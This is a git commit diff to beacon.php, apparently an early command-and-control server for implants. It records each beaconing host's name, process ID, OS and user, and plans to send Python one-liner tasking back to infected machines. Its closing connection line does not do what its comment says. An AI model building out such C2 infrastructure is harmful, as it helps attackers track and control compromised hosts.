fcb5ca27bc58fc2d17622f69b293da327c480d01
Hunter Hardman <t3ntman@gmail.com>
2017-03-19 07:25:24 -0600

    Added in MySQL statement to determine if new or old beaconing host

--- Website/beacon.php
+++ Website/beacon.php
@@ -3,15 +3,33 @@
 
     # JSON decodes implant POST data
     $post_data = json_decode(file_get_contents("php://input"), true);
-
     $hostname = $post_data["hostname"];
     $process_id = $post_data["process_id"];
     $os = $post_data["os"];
     $current_user = $post_data["current_user"];
 
-    # TO DO: Check if old or new beaconing host
+    # SQL statement to determine if this is a new or old beaconing host
+    $statement = $database_connection->prepare("SELECT * FROM `implants` WHERE `hostname` = :hostname AND `process_id` = :process_id");
+    $statement->bindValue(":hostname", $hostname);
+    $statement->bindValue(":process_id", $process_id);
+    $statement->execute();
+    $row_count = $statement->rowCount();
 
-    # TO DO: If new host, check for tasking
+    # If new host
+    if ($row_count == "0") {
+        echo "new host";
 
-    # TO DO: If tasking, echo appropriate Python one-liner code to do the task
+        # TO DO: If new host, add to "implants" table
+    }
+    # Else old host
+    else {
+        echo "old host";
+
+        # TO DO: If old host, check for tasking
+
+        # TO DO: If tasking found, echo appropriate Python one-liner code to do the task here
+    }
+
+    # Kills database connection
+    $statement->connection = null;
 ?>
